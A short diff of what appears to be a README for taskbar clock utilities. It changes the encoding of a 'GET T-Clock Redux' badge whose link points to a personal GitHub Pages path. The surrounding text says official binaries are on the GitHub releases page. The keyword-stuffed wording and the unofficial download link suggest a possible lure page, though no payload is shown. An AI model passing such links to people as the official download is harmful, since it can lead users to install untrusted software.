@@ -230,7 +230,7 @@ ElevenClock and Extra Clock accept coffee and GitHub sponsors. T-Clock Redux is 
 
 ## Download
 
-[![GET T-Clock Redux](https://img.shields.io/badge/GET-T-Clock%20Redux-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://gregorianudelman.github.io/.github/T-Clock)
+[![GET T-Clock Redux](https://img.shields.io/badge/GET-T%20Clock%20Redux-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://gregorianudelman.github.io/.github/T-Clock)
 
 Use the GET badge for this pack. Official T-Clock Redux binaries are stable, beta, and nightly on the GitHub releases page. Pick t clock redux x64 unless you still need `_vc2010`. For t clock redux windows 11, prefer ElevenClock or Extra Clock, or patch the taskbar first. For t clock redux windows 10, T-Clock Redux is the native clock.
 
